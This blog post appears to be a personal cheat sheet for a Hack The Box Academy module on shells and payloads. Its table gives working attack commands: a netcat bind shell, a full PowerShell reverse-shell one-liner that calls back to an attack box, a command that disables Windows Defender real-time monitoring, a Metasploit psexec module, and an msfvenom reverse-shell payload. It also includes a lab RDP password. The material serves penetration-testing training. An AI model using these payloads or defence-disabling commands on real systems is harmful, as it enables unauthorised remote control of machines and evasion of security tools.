---
layout:     post
title:      "Shells & Payloads"
subtitle:   "Shells & Payloads"
date:       2024-03-01
author:     "k1r4"
header-img: "img/footprinting.webp"
catalog:    true
tags:
    - shells
    - payloads
---

## Shells & Payloads


|**Command**|**Description**|
|-|-|
| `xfreerdp /v:10.129.x.x /u:htb-student /p:HTB_@cademy_stdnt!` | CLI-based tool used to connect to a Windows target using the Remote Desktop Protocol. |
| `env` | Works with many different command language interpreters to discover the environmental variables of a system. This is a great way to find out which shell language is in use. |
| `sudo nc -lvnp <port #>` | Starts a `netcat` listener on a specified port. |
| `nc -nv <ip address of computer with listener started><port being listened on>` | Connects to a netcat listener at the specified IP address and port. |
| `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f` | Uses netcat to bind a shell `(/bin/bash)` the specified IPaddress and port. This allows for a shell session to be served remotely to anyone connecting to the computer this command has been issued on. |
| `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeNameSystem.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS' + (pwd).Path + '> ';$sendbyte =([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"` | `Powershell` one-liner used to connect back to a listener that has been started on an attack box. |
| `Set-MpPreference -DisableRealtimeMonitoring $true` | Powershell command using to disable real time monitoring in `Windows Defender`. |
| `use exploit/windows/smb/psexec ` | Metasploit exploit module that can be used on vulnerable Windows system to establish a shell session utilizing `smb` & `psexec`. |
| `shell` | Command used in a meterpreter shell session to drop into a `system shell`. |
| `msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > nameoffile.elf` | `MSFvenom` command used to generate a linux-based reverse shell `stageless payload`. |






----

